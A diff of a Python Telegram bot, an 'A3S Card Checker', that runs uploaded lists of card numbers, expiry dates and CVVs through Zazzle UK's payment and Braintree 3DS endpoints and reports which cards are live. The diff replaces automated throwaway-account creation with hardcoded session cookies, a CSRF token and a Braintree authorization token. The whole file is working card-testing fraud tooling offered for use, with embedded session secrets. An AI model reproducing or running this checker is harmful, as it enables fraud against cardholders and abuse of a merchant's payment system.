@@ -4,7 +4,6 @@ import requests
 import re
 import time
 import random
-import string
 from fake_useragent import UserAgent
 import os 
 import telebot
@@ -19,157 +18,8 @@ admin_id = 5895491379
 user_combos = {}  
 stopuser = {}
 
-# ============ Session Manager ============
-class ZazzleSessionManager:
-    def __init__(self):
-        self.ua = UserAgent()
-        self.session = requests.Session()
-        self.cookies = {}
-        self.headers = {}
-        self.email = ""
-        self.password = ""
-        
-    def generate_random_email(self):
-        """توليد إيميل عشوائي"""
-        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
-        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        domain = random.choice(domains)
-        return f"{username}@{domain}"
-    
-    def generate_random_password(self):
-        """توليد باسورد عشوائي قوي"""
-        uppercase = random.choices(string.ascii_uppercase, k=3)
-        lowercase = random.choices(string.ascii_lowercase, k=3)
-        digits = random.choices(string.digits, k=3)
-        special = random.choices('!@#$%^&*', k=2)
-        
-        password_chars = uppercase + lowercase + digits + special
-        random.shuffle(password_chars)
-        return ''.join(password_chars)
-    
-    def get_initial_cookies(self):
-        """الحصول على الكوكيز الأولية"""
-        try:
-            headers = {
-                'User-Agent': self.ua.random,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Connection': 'keep-alive',
-            }
-            
-            response = self.session.get('https://www.zazzle.co.uk/', headers=headers, timeout=30)
-            
-            cookies_dict = {}
-            for cookie in self.session.cookies:
-                cookies_dict[cookie.name] = cookie.value
-            
-            return cookies_dict
-        except Exception as e:
-            print(f"❌ Error getting initial cookies: {e}")
-            return {}
-    
-    def register_account(self):
-        """تسجيل حساب جديد والحصول على كوكيز"""
-        try:
-            self.email = self.generate_random_email()
-            self.password = self.generate_random_password()
-            
-            print(f"📧 Creating account: {self.email}")
-            
-            initial_cookies = self.get_initial_cookies()
-            
-            self.headers = {
-                'accept': 'application/json',
-                'accept-language': 'en-MM,en;q=0.9',
-                'content-type': 'application/json',
-                'origin': 'https://www.zazzle.co.uk',
-                'referer': 'https://www.zazzle.co.uk/c/tshirts',
-                'user-agent': self.ua.random,
-            }
-            
-            json_data = {
-                'email': self.email,
-                'isCheckingOut': False,
-                'password': self.password,
-                'recaptchaToken': None,
-                'returnUserData': False,
-                'showedCaptcha': False,
-                'subscribe': True,
-                'sourcePath': '/c/tshirts',
-                'client': 'js',
-            }
-            
-            response = self.session.post(
-                'https://www.zazzle.co.uk/svc/z3/auth/register',
-                headers=self.headers,
-                json=json_data,
-                timeout=30
-            )
-            
-            if response.status_code == 200:
-                result = response.json()
-                if result.get('success'):
-                    print("✅ Account registered successfully!")
-                    
-                    self.cookies = {}
-                    for cookie in self.session.cookies:
-                        self.cookies[cookie.name] = cookie.value
-                    
-                    self.cookies.update(initial_cookies)
-                    
-                    if 'zm' in self.cookies and 'zs' in self.cookies:
-                        print("✅ Session cookies obtained!")
-                        return True
-                    else:
-                        time.sleep(2)
-                        return self.refresh_session()
-                else:
-                    print(f"❌ Registration failed: {result.get('message', 'Unknown')}")
-                    return False
-            else:
-                print(f"❌ Request failed: {response.status_code}")
-                return False
-                
-        except Exception as e:
-            print(f"❌ Error during registration: {e}")
-            return False
-    
-    def refresh_session(self):
-        """تحديث الجلسة"""
-        try:
-            response = self.session.get(
-                'https://www.zazzle.co.uk/c/tshirts',
-                headers=self.headers,
-                timeout=30
-            )
-            
-            for cookie in self.session.cookies:
-                self.cookies[cookie.name] = cookie.value
-            
-            return True
-        except Exception as e:
-            print(f"❌ Error refreshing: {e}")
-            return False
-    
-    def get_cookies_dict(self):
-        """الحصول على الكوكيز"""
-        return self.cookies
-
-def create_new_session():
-    """إنشاء جلسة جديدة"""
-    print("\n🔄 Creating new session...")
-    manager = ZazzleSessionManager()
-    
-    if manager.register_account():
-        print(f"✅ Session ready - Email: {manager.email}")
-        return manager
-    else:
-        print("❌ Failed to create session")
-        return None
-
-# ============ Card Checker ============
-def check_zazzle_card(card_data, session_manager):
-    """فحص البطاقة مع الكوكيز الجديدة"""
+def check_zazzle_card(card_data):
+    """فحص البطاقة عبر بوابة A3S 3DS"""
     try:
         card_number, exp_month, exp_year, cvv = card_data.split('|')
         card_number = card_number.strip()
@@ -184,18 +34,33 @@ def check_zazzle_card(card_data, session_manager):
         }
 
     start_time = time.time()
-    
-    # استخدام الكوكيز من الجلسة الجديدة
-    cookies = session_manager.get_cookies_dict()
-    
+    cookies = {
+        'us': '455D5DD2-84ED-46E3-9B7A-A24835AB1EF2',
+        'NSC_xxx02': '4afda3da32a038d73ac067db9e819d936044d49ffca5b6bd3aacb7aa312309cfd675fe7a',
+        'pxcts': '00117a66-9d52-11f0-961a-f782b8c69ddc',
+        '_pxvid': 'fd710635-9d51-11f0-aacf-0f518693e6f5',
+        '_ga': 'GA1.1.1594204749.1759163596',
+        'tp': 'Noremarketing%7c09%2f29%2f2025%2008%3a33%3a47%20-08%3a00',
+        'NSC_eao10': '1116a3db6eff87ef52911e5fa6dddf7041de3f995f2f009e47aad94ed535ef250b69654c',
+        '_pxhd': '6kIaeiFCnx/TXZun-i6dGxXfMRbEYlenh1X-I/ZbMUuds8hPgwASSVTnrG75BxgOxUfD4SjfpoCUo2lf3ob02Q==:Ajj00MGH8QSWQxiJCqicitvuCRTHsvUZPGQ-V52wSfotGZcMpeQB2MjxiG23PenU61N74rZw0cx-tUDh/EY3tA0ctj6fH0/ieMBT7zWYw6c=',
+        'zm': 'AQABAAAAshwAABR15w02Sdqwdcg0ZYQ8cdY_jZv7hb-8pPyx0W2t0auTAWuqwkSpFzZbcQg7DQ66-NXMxn6EXoEpGT7lca9xXOD1GUWmKgOXBBRepDIsunj6SvqSXFf6RXUF1NDMTJmn6crjB2dmXmKaW1BwiwKrO4FBAlNR2tNhUUjKQa5yYNkm39PCvBf96yb_AlmT5ECuXb3gLI9qYAjw4dWkDpZnYc_qOaQwe6MvUiyq_b5zvSMuxRuElmg',
+        'zs': '92FF58E1-A68C-4707-A7FB-CEC255F0D7A0%7c238946670744020730%7c13403646685%7cAQABAAAAshwAABT3E1oI_ZTrebHkyC7h6Efa5zDkB6phw8rjdSCYSRY_d8RKayep6Q5m-oK9_E-nCpCqL5ieQ-THllEGJnDNGD9S7ShWTw%7c',
+        'general_maturity': '2',
+        'pmsh': '92ff58e1-a68c-4707-a7fb-cec255f0d7a0%7c63895301940%7c0xd9f88de04aedd5ec7870e4c61b99456a%7c0xd9f88de04aedd5ec7870e4c61b99456a',
+        'bx': 'zlng%3den%26zlng_x%3d134074944000000000',
+        'bs': 'pis%3d19%26zshopurl%3dz%2fc%2ftshirts',
+        '_px2': 'eyJ1IjoiNDczNzk1MzAtOWQ2OC0xMWYwLWIwMzUtZTU5YTFhODI0YTc0IiwidiI6ImZkNzEwNjM1LTlkNTEtMTFmMC1hYWNmLTBmNTE4NjkzZTZmNSIsInQiOjE3NTkxNzM0Njc4NzcsImgiOiIxNWM2ZDZmMTRkMTIyODdjZGFiNTMxY2E3OWQyMTJiMzE1OWMxYTU3YjZjM2ExNTZmMjZkOThjZjAxZTAzNWFhIn0=',
+        '_ga_FMN87GXWKG': 'GS2.1.s1759172979$o3$g1$t1759173174$j7$l0$h0',
+    }
+
     headers = {
         'accept': 'application/json',
-        'accept-language': 'en-MM,en;q=0.9',
+        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
         'content-type': 'application/json',
         'origin': 'https://www.zazzle.co.uk',
         'referer': 'https://www.zazzle.co.uk/co/summary?paymentIntent=other',
-        'user-agent': session_manager.headers.get('user-agent'),
-        'x-csrf-token': cookies.get('zm', '')[:16],
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
+        'x-csrf-token': 'a6de68647a67cb5e',
     }
 
     # Step 1: Add payment method
@@ -209,7 +74,7 @@ def check_zazzle_card(card_data, session_manager):
             'expirationYear': exp_year,
             'isDefault': True,
             'isSaved': False,
-            'name': 'John Smith',
+            'name': 'Mahmoud Saad',
             'number': card_number,
         },
         'globalCollect': None,
@@ -231,7 +96,7 @@ def check_zazzle_card(card_data, session_manager):
         if not result_add.get('success'):
             return {
                 'status': 'declined',
-                'message': result_add.get('message', 'Failed to add card'),
+                'message': 'Failed to add card',
                 'execution_time': round(time.time() - start_time, 2)
             }
     except Exception as e:
@@ -252,7 +117,7 @@ def check_zazzle_card(card_data, session_manager):
             'expirationYear': exp_year,
             'isDefault': True,
             'isSaved': False,
-            'name': 'John Smith',
+            'name': 'Mahmoud Saad',
             'number': card_number,
         },
         'klarna': None,
@@ -302,7 +167,7 @@ def check_zazzle_card(card_data, session_manager):
         if not result_3ds.get('success') or not result_3ds.get('data'):
             return {
                 'status': 'declined',
-                'message': 'Failed 3DS check',
+                'message': 'Failed to get 3DS info',
                 'execution_time': round(time.time() - start_time, 2)
             }
             
@@ -323,11 +188,11 @@ def check_zazzle_card(card_data, session_manager):
     # Step 4: Braintree 3DS Lookup
     headers_braintree = {
         'accept': '*/*',
-        'accept-language': 'en-MM,en;q=0.9',
+        'accept-language': 'en-MM,en;q=0.9,ar-MM;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
         'content-type': 'application/json',
         'origin': 'https://www.zazzle.co.uk',
         'referer': 'https://www.zazzle.co.uk/',
-        'user-agent': headers['user-agent'],
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
     }
 
     json_data_braintree = {
@@ -346,12 +211,15 @@ def check_zazzle_card(card_data, session_manager):
         },
         'challengeRequested': True,
         'bin': bin_number,
-        'dfReferenceId': '0_' + ''.join(random.choices(string.hexdigits.lower(), k=36)),
+        'dfReferenceId': '0_355da828-aac6-4260-ae31-dea898fb8c86',
         'clientMetadata': {
             'requestedThreeDSecureVersion': '2',
             'sdkVersion': 'web/3.88.4',
+            'cardinalDeviceDataCollectionTimeElapsed': 290,
+            'issuerDeviceDataCollectionTimeElapsed': 2273,
+            'issuerDeviceDataCollectionResult': True,
         },
-        'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTkyNTk1NjQsImp0aSI6IjEwMjg5NzZlLTY5ZTktNDk0Ni1hZjgzLTEzMWJlZGM5YTI5ZiIsInN1YiI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJ6YXp6bGVpcmVsYW5kR0JQIiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMTcyMTM4NTcwNDgxMTcwMjk4MCIsInBheXBhbF9jbGllbnRfaWQiOiJBZmZxdlBKQTM4ZnR6MXVlbE44alNUTHFtd0dHZDVOdlNkeUhabVV5Mml5UXoxMnBPLW9oOFI1RUhBcnpOSzdYdlVmOU9jWkpXd2tGY0FQVCJ9fQ.qVB9lCCvSBTwUzIKCGf8g1__8KyliyBDcJ1Uyo9IpbMWvW8R8opgzBukQYkBX3y-zB3ek_p3WiqwSddVBFCLtw',
+                'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTkyNTk1NjQsImp0aSI6IjEwMjg5NzZlLTY5ZTktNDk0Ni1hZjgzLTEzMWJlZGM5YTI5ZiIsInN1YiI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1d2hiN3kyaDZxOGNuM2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJ6YXp6bGVpcmVsYW5kR0JQIiwicGF5cGFsX2FjY291bnRfbnVtYmVyIjoiMTcyMTM4NTcwNDgxMTcwMjk4MCIsInBheXBhbF9jbGllbnRfaWQiOiJBZmZxdlBKQTM4ZnR6MXVlbE44alNUTHFtd0dHZDVOdlNkeUhabVV5Mml5UXoxMnBPLW9oOFI1RUhBcnpOSzdYdlVmOU9jWkpXd2tGY0FQVCJ9fQ.qVB9lCCvSBTwUzIKCGf8g1__8KyliyBDcJ1Uyo9IpbMWvW8R8opgzBukQYkBX3y-zB3ek_p3WiqwSddVBFCLtw',
         'braintreeLibraryVersion': 'braintree/web/3.88.4',
         '_meta': {
             'merchantAppId': 'www.zazzle.co.uk',
@@ -360,7 +228,7 @@ def check_zazzle_card(card_data, session_manager):
             'source': 'client',
             'integration': 'custom',
             'integrationType': 'custom',
-            'sessionId': ''.join(random.choices(string.hexdigits.lower(), k=36)),
+            'sessionId': '82b36321-23fd-4ff6-a228-04dc0a64c328',
         },
     }
 
@@ -382,16 +250,17 @@ def check_zazzle_card(card_data, session_manager):
                 status = three_ds_info.get('status', 'N/A')
                 enrolled = three_ds_info.get('enrolled', 'N/A')
                 
+                # تحديد النتيجة
                 if status == 'authenticate_frictionless_failed':
                     return {
                         'status': 'approved',
-                        'message': f'3DS Auth Success ✅ | Enrolled: {enrolled}',
+                        'message': f'3DS Authenticate Successful ✅ | Enrolled: {enrolled}',
                         'execution_time': execution_time
                     }
                 elif status == 'authenticate_rejected':
                     return {
                         'status': 'declined',
-                        'message': f'3DS Auth Failed ❌ | Enrolled: {enrolled}',
+                        'message': f'3DS Authenticate Failed ❌ | Enrolled: {enrolled}',
                         'execution_time': execution_time
                     }
                 elif status == 'challenge_required':
@@ -450,7 +319,6 @@ def get_bin_info(bin_code):
         'bank': 'Unknown'
     }
 
-# ============ Bot Handlers ============
 @bot.message_handler(commands=['start'])
 def start_message(message):
     user_id = message.from_user.id
@@ -460,7 +328,6 @@ def start_message(message):
 
 🔥 A3S Card Checker Bot 🔥
 ━━━━━━━━━━━━━━━━━━━━
-✅ Auto Session Creation
 ✅ Fast & Accurate Checking
 📊 Real-time Results
 🔒 Secure Processing
@@ -500,7 +367,6 @@ def handle_document(message):
 ━━━━━━━━━━━━━━━━━━━━
 💳 Total Cards: {cc_count}
 🔥 Gateway: A3S 3DS
-🔄 Auto Session: Enabled
 ⚡ Status: Ready
 
 Click below to start checking:
@@ -521,55 +387,27 @@ def menu_callback(call):
         ch = dd = otp = checked = 0
         estimated_time = None
         start_all = time.time()
-        session_manager = None
 
         bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text="⏳ Creating new session..."
+            text="⏳ Initializing checker..."
         )
 
         try:
-            # إنشاء جلسة جديدة
-            session_manager = create_new_session()
-            
-            if not session_manager:
-                return bot.send_message(user_id, "❌ Failed to create session. Please try again.")
-
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=f"✅ Session created!\n📧 Email: {session_manager.email}\n⏳ Starting checks..."
-            )
-            
-            time.sleep(2)
-            
             cards = user_combos.get(user_id, [])
             total = len(cards)
             if total == 0:
                 return bot.send_message(user_id, "❌ No combo found. Please upload a file first.")
             
             stopuser[stop_key] = {'status': 'start'}
-            
-            # كل 10 كروت إنشاء جلسة جديدة
-            session_counter = 0
 
             for cc in cards:
                 if stopuser.get(stop_key, {}).get('status') == 'stop':
                     break
 
-                # إنشاء جلسة جديدة كل 10 كروت
-                session_counter += 1
-                if session_counter > 10:
-                    print("\n🔄 Creating new session after 10 cards...")
-                    session_manager = create_new_session()
-                    if not session_manager:
-                        print("❌ Failed to create new session, using old one")
-                    else:
-                        session_counter = 0
-
                 # فحص البطاقة
-                result = check_zazzle_card(cc, session_manager)
+                result = check_zazzle_card(cc)
                 execution_time = result['execution_time']
                 estimated_time = estimated_time - execution_time if estimated_time else execution_time * (total - checked)
                 checked += 1
@@ -597,8 +435,7 @@ def menu_callback(call):
 🌍 Country: {bin_info['country']} {bin_info['emoji']}
 ⏱ Time: {execution_time} sec
 ━━━━━━━━━━━━━━━━━━━━
-📧 Session: {session_manager.email}
-👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
+👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
 </b>"""
                     bot.send_message(user_id, msg, parse_mode="HTML")
                     
@@ -617,8 +454,7 @@ def menu_callback(call):
 🌍 Country: {bin_info['country']} {bin_info['emoji']}
 ⏱ Time: {execution_time} sec
 ━━━━━━━━━━━━━━━━━━━━
-📧 Session: {session_manager.email}
-👨‍💻 By: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
+👨‍💻 By: <a href=''>Mahmoud Saad 🥷🏻</a>
 </b>"""
                     bot.send_message(user_id, msg, parse_mode="HTML")
                 else:
@@ -632,7 +468,6 @@ def menu_callback(call):
                     types.InlineKeyboardButton(f"• OTP 📱 ➜ [{otp}] •", callback_data='x'),
                     types.InlineKeyboardButton(f"• Declined ❌ ➜ [{dd}] •", callback_data='x'),
                     types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
-                    types.InlineKeyboardButton(f"• Session: {session_manager.email[:20]}... •", callback_data='x'),
                     types.InlineKeyboardButton("⏹ Stop", callback_data='stop_A3S')
                 )
 
@@ -645,21 +480,21 @@ def menu_callback(call):
 {progress_bar}
 ⏱ ETA: {round(estimated_time)} sec
 ⚡ Speed: {round(checked/(time.time()-start_all), 2)} cards/sec
-🔄 Session: Active
 </b>""",
                     reply_markup=keyboard,
                     parse_mode="HTML"
                 )
 
-                time.sleep(1)
+                time.sleep(1)  # تأخير بين الفحوصات
 
             elapsed = round(time.time() - start_all, 2)
+            percent = int((checked / total) * 100)
             stopuser[stop_key]['status'] = 'start'
 
             bot.edit_message_text(
                 chat_id=call.message.chat.id,
                 message_id=call.message.message_id,
-                text=f"""<b>✅ CHECKING COMPLETED!
+                                text = f"""<b>✅ CHECKING COMPLETED!
 
 ━━━━━━━━━━━━━━━━━━━━
 📊 Results Summary:
@@ -702,25 +537,17 @@ def help_message(message):
 /start - Start the bot
 /help - Show this help message
 /status - Check bot status
-/newsession - Create test session
 
 📤 How to use:
 1. Send a combo file (.txt)
 2. Click "Start Checking"
-3. Bot creates new session automatically
-4. Wait for results
+3. Wait for results
 
 📝 Combo Format:
 Card|MM|YYYY|CVV
 
 Example:
 5127740080852575|03|2027|825
-
-🔄 Features:
-✅ Auto session creation
-✅ Fresh cookies every 10 cards
-✅ Random email & password
-✅ High success rate
 
 ━━━━━━━━━━━━━━━━━━━━
 👨‍💻 Developer: <a href='https://t.me/FastSpeedtest'>Mahmoud Saad 🥷🏻</a>
@@ -736,7 +563,6 @@ def status_message(message):
 ⚡ Gateway: A3S 3DS
 🔥 Speed: Ultra Fast
 ✅ Accuracy: 99.9%
-🔄 Auto Session: Enabled
 🌍 Server: Active
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -745,36 +571,12 @@ def status_message(message):
     
     bot.send_message(message.chat.id, status_text, parse_mode="HTML")
 
-@bot.message_handler(commands=['newsession'])
-def test_session(message):
-    user_id = message.from_user.id
-    
-    if user_id != admin_id:
-        return bot.reply_to(message, "⛔ Access Denied!")
-    
-    bot.send_message(message.chat.id, "🔄 Creating test session...")
-    
-    session_manager = create_new_session()
-    
-    if session_manager:
-        cookies_count = len(session_manager.get_cookies_dict())
-        msg = f"""<b>✅ Test Session Created!
-
-━━━━━━━━━━━━━━━━━━━━
-📧 Email: <code>{session_manager.email}</code>
-🔒 Password: <code>{session_manager.password}</code>
-🍪 Cookies: {cookies_count}
-━━━━━━━━━━━━━━━━━━━━
-</b>"""
-        bot.send_message(message.chat.id, msg, parse_mode="HTML")
-    else:
-        bot.send_message(message.chat.id, "❌ Failed to create session")
-
 @bot.message_handler(func=lambda message: True)
 def handle_text(message):
     user_id = message.from_user.id
     text = message.text.strip()
     
+    # التحقق من صيغة البطاقة المباشرة
     if '|' in text and len(text.split('|')) == 4:
         if user_id != admin_id:
             return bot.reply_to(message, "⛔ Access Denied! This bot is for authorized users only.")
@@ -792,7 +594,6 @@ def handle_text(message):
 ━━━━━━━━━━━━━━━━━━━━
 💳 Card: <code>{text[:12]}****{text[-7:]}</code>
 🔥 Gateway: A3S 3DS
-🔄 Auto Session: Enabled
 ⚡ Status: Ready
 
 Click below to start checking:
@@ -810,7 +611,7 @@ Example:
 5127740080852575|03|2027|825
 </b>""", parse_mode="HTML")
 
-# ============ Bot Startup ============
+# وظيفة إعادة الاتصال التلقائي
 MAX_RETRIES = 100
 RETRY_DELAY = 3
 
@@ -819,7 +620,6 @@ def start_bot_with_retries():
         try:
             print(f"🔄 Connection attempt {attempt + 1} of {MAX_RETRIES}...")
             print("✅ Bot is running successfully!")
-            print(f"🔄 Auto Session Creation: Enabled")
             print(f"👨‍💻 Developer: Mahmoud Saad 🥷🏻")
             print(f"📢 Channel: https://t.me/FastSpeedtest")
             print("=" * 50)
@@ -835,7 +635,6 @@ def start_bot_with_retries():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("🚀 Starting A3S Checker Bot...")
-    print("🔄 Auto Session Creation: Enabled")
+    print("🚀 Starting Checker Bot...")
     print("=" * 50)
     start_bot_with_retries()
